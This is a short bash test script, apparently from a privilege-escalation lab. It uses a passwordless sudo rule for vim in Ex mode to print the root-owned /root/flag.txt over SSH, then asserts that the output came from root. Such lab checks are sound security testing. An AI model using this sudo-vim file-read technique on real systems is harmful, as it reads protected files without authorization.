#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
# Ex-mode dump of root-owned flag.
out="$(ssh_run 'sudo -n /usr/bin/vim -es -c '\''%print'\'' -c '\''q!'\'' /root/flag.txt')"
assert_root_output "${out}"
